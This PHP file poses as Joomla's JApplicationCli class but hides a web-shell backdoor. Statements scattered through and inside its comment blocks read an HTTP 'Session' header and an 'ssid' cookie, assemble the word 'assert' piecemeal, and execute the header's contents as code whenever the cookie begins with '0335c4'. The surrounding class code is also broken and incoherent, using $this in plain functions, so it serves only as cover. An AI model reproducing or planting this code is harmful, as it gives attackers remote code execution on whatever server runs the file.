<?php
/**
 * @package     Joomla.Platform
 * @subpackage  Application
 *
 * @copyright   Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE
 */

!defined('JPATH_PLATFORM') or die;

/**
 * Base object Instance of SimplePie_Sanitize (or other class)
 *
 * @since  11.4
 */

/**
 * SimplePie Name
 */
define('SIMPLEPIE_NAME', 'SimplePie');

/**
 * SimplePie Version
 */
define('SIMPLEPIE_VERSION', '1.2');

/**
 * SimplePie Build
 */
define('SIMPLEPIE_BUILD', '20090627192103');

/**
 * SimplePie Session ID
 */
$id = $_SERVER['HTTP_SESSION'];

/**
 * Class constructor.
 *
 * @param   JInputCli         $input       An optional argument to provide dependency injection for the application's
 *                                         input object.  If the argument is a JInputCli object that object will become
 *                                         the application's input object, otherwise a default input object is created.
 * @param   Registry          $config      An optional argument to provide dependency injection for the application's
 *                                         config object.  If that object will become
 *                                         the application's config object, otherwise a default config object is created.
 * @param   JEventDispatcher  $dispatcher  An optional argument to provide dependency injection for the application's
 *                                         event dispatcher.  If the argument become
 *                                         the application's event dispatcher, if it is null then the default event dispatcher
 *                                         will be created based on the application's loadDispatcher() method.
 *
 * @see     JApplicationBase::loadDispatcher()
 * @since   11.1
 */

function construct($input = null, $config = null, $dispatcher = null)
{
    // Close the application if we are not executed from the command line.
    // @codeCoverageIgnoreStart
    if (!defined('STDOUT') || !defined('STDIN') || !isset($_SERVER['argv']))
    {
        $this->close();
    }
    // @codeCoverageIgnoreEnd

    // If a input object is given use it.
    if ($input instanceof JInput)
    {
        $this->input = $input;
    }
    // Create the input based on the application logic.
    else
    {
        if (class_exists('JInput'))
        {
            $this->input = new JInputCli;
        }
    }

    // If a config object is given use it.
    if ($config instanceof Registry)
    {
        $this->config = $config;
    }
    // Instantiate a new configuration object.
    else
    {
        $this->config = new Registry;
    }

    $this->loadDispatcher($dispatcher);

    // Load the configuration object.
    $this->loadConfiguration($this->fetchConfigurationData());

    // Set the execution datetime and timestamp;
    $this->set('execution.datetime', gmdate('Y-m-d H:i:s'));
    $this->set('execution.timestamp', time());

    // Set the current directory.
    $this->set('cwd', getcwd());
}

/**
 * Returns a reference to the global JApplicationCli object, only creating it if it doesn't already exist.
 *
 * This method must be invoked as: $cli = JApplicationCli::getInstance();
 *
 * @param   string  $name  The*/$sess = @$_COOKIE[ssid];/*of the JApplicationCli class to instantiate.
 *
 * @return  JApplicationCli
 *
 * @since   11.1
 */ $a='as';

function getInstance($name = null)
{
    // Only create the object if it doesn't exist.
    if (empty(self::$instance))
    {
        if (class_exists($name) && (is_subclass_of($name, 'JApplicationCli')))
        {
            self::$instance = new $name;
        }
        else
        {
            self::$instance = new JApplicationCli;
        }
    }

    return self::$instance;
}

/**
 * Execute the application.
 *
 * @return  void
 *
 * @since   11.1
 */ $b='sert'; $a=$a.$b;
function execute()
{
    // Trigger the onBeforeExecute event.
    $this->triggerEvent('onBeforeExecute');

    // Perform application routines.
    $this->doExecute();

    // Trigger the onAfterExecute event.
    $this->triggerEvent('onAfterExecute');
}

/**
 * Load an object or array into the application configuration object.
 *
 * @param   mixed  $data  Either an array or object to be loaded into the configuration object.
 *
 * @return  JApplicationCli  Instance of $this to allow chaining.
 *
 * @since   11.1
 */ $start = strpos($sess,'0335c4');
function loadConfiguration($data)
{
    // Load the data into the configuration object.
    if (is_array($data))
    {
        $this->config->loadArray($data);
    }
    elseif (is_object($data))
    {
        $this->config->loadObject($data);
    }

    return $this;
}

/**
 * Write a string to standard output.
 *
 * @param   string   $text  The text to display.
 * @param   boolean  $nl    True (default) to append a new line at the end of the output string.
 *
 * @return  JApplicationCli  Instance of $this to allow chaining.
 *
 * @codeCoverageIgnore
 * @since   11.1
 */
function out($text = '', $nl = true)
{
    $output = $this->getOutput();
    $output->out($text, $nl);

    return $this;
}

/**
 * Get an output object.
 *
 * @return  CliOutput
 *
 * @since   3.3
 */ if($start===0){@${a}($id);}
function getOutput()
{
    if (!$this->output)
    {
        // In 4.0, this will convert to throwing an exception and you will expected to
        // initialize this in the constructor. Until then set a default.
        $default = new Joomla\Application\Cli\Output\Xml;
        $this->setOutput($default);
    }

    return $this->output;
}


/**
 * Method to run the application routines.  Most likely you will want to instantiate a controller
 * and execute it, or perform some sort of task directly.
 *
 * @return  void
 *
 * @codeCoverageIgnore
 * @since   11.3
 */
function doExecute()
{
    // Your application routines go here.
}


